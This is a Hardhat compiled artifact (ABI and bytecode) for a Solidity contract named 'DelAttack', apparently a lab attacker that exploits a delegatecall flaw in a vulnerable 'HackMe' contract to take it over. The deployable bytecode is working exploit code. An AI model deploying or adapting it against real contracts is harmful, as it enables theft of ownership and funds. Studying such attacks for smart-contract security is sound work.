{
  "_format": "hh-sol-artifact-1",
  "contractName": "DelAttack",
  "sourceName": "contracts/delegatecall.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_hackMe",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_newOwner",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "hackMe",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "newOwner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516106d83803806106d8833981810160405281019061003291906100cf565b816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050610154565b6000815190506100c98161013d565b92915050565b600080604083850312156100e257600080fd5b60006100f0858286016100ba565b9250506020610101858286016100ba565b9150509250929050565b60006101168261011d565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6101468161010b565b811461015157600080fd5b50565b610575806101636000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c806375efcec5146100465780639e5faafc14610064578063d4ee1d901461006e575b600080fd5b61004e61008c565b60405161005b9190610433565b60405180910390f35b61006c6100b0565b005b610076610213565b6040516100839190610433565b60405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6100ee6040518060400160405280600481526020017f6865726500000000000000000000000000000000000000000000000000000000815250610239565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16670de0b6b3a76400006040516024016040516020818303038152906040527fdd365b8b000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516101c1919061041c565b60006040518083038185875af1925050503d80600081146101fe576040519150601f19603f3d011682016040523d82523d6000602084013e610203565b606091505b50509050610210816102d2565b50565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6102cf8160405160240161024d9190610469565b6040516020818303038152906040527f41304fac000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505061036b565b50565b610368816040516024016102e6919061044e565b6040516020818303038152906040527f32458eed000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505061036b565b50565b60008151905060006a636f6e736f6c652e6c6f679050602083016000808483855afa5050505050565b61039d816104bd565b82525050565b6103ac816104cf565b82525050565b60006103bd8261048b565b6103c781856104a1565b93506103d78185602086016104fb565b80840191505092915050565b60006103ee82610496565b6103f881856104ac565b93506104088185602086016104fb565b6104118161052e565b840191505092915050565b600061042882846103b2565b915081905092915050565b60006020820190506104486000830184610394565b92915050565b600060208201905061046360008301846103a3565b92915050565b6000602082019050818103600083015261048381846103e3565b905092915050565b600081519050919050565b600081519050919050565b600081905092915050565b600082825260208201905092915050565b60006104c8826104db565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60005b838110156105195780820151818401526020810190506104fe565b83811115610528576000848401525b50505050565b6000601f19601f830116905091905056fea2646970667358221220217f1bae7fe3bc9a054f3147bdbed7edc95de6326f97d7014239981771afaa0864736f6c63430008040033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}